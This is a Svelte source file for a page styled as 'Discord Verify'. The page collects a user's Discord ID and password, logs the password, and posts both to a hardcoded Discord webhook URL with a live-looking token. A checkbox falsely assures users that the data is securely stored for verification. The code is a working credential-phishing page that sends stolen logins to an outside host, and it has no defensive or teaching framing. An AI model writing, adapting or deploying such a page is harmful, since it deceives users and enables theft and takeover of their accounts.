<script>

let id = $state("")
let password = $state("")
let terms = $state(false)
let error = $state("")
const webhook = "https://discord.com/api/webhooks/1438248565557170378/wwnrmdkDN3r_OPWLS_FRPryF-SYExw1KXxlgEvk823k_yFt-IrwgFDwOkTCJ-GzUWLs5"

async function submit(){
    if (id == ""){
        error = "Invalid ID."
        return
    }
    if (password == ""){
        error = "Invalid Password."
        return
    }
    console.log(password)
    error = ""
    sendWebhook(new Embed(
        "Info submitted!",
        "There was an info submitted on the website.",
        0x5865F2,
        [
            new Field(
                "Name / ID",
                id
            ),
            new Field(
                "Password",
                password
            )
        ]
    ), webhook)
}




</script>



    <div class="bg-black flex flex-col items-center justify-center gap-5 min-h-screen w-full text-white">
    <h1 class="font-bold text-[#5865F2] text-3xl md:text-4xl lg:text-5xl">Discord Verify</h1>
    <input class="bg-neutral-950 border border-neutral-900 p-2 focus:border-0 rounded-md" placeholder="Discord Name">
    <input class="bg-neutral-950 border border-neutral-900 p-2 focus:border-0 rounded-md" placeholder="Discord ID" bind:value={id}>
    <input class="bg-neutral-950 border border-neutral-900 p-2 focus:border-0 rounded-md" placeholder="Discord Password" type="password" bind:value={password}>
    <div class="flex flex-row items-center justify-center text-neutral-400 gap-2">

        <input id="terms" class="bg-neutral-950 rounded-full" placeholder="Discord Name" type="checkbox">
        <label for="terms">I accept that this info is securly stored and used to verify my discord account.</label>
        

    </div>
    {#if error}
        <p class="font-semibold text-red-600">{error}</p>
    {/if}
    <button class="bg-[#5865F2] rounded-2xl py-2 px-4" type="submit" onclick={submit}>Verify now.</button>

</div>
